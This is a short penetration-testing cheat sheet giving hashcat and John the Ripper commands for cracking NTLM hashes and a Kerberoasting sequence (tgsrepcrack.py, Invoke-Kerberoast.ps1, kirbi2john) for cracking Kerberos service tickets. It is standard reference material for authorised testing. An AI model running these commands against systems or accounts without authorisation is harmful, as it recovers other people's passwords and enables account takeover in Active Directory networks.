# Hash Cracking Techniques

Cracking NT (NTLM) hashes

```bash
$ hashcat -m 1000 -a 0 hashes.txt [path/to/wordlist.txt] -o cracked.txt
$ john --wordlist=[path/to/wordlist.txt] hashes.txt
```

Kerberoasting - Crack SPN hashes via. exported `.kirbi` tickets.

* Walkthrough: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)

```bash
# Kerberoast
$ python3 tgsrepcrack.py rockyou.txt [ticket.kirbi]  # locally crack hashes
PS> Invoke-Kerberoast.ps1                            # crack hashes on target

# John the Ripper
$ python3 kirbi2john.py -o johncrackfile ticket.kirbi  # convert ticket to john file
$ john --wordlist=rockyou.txt johncrackfile
```
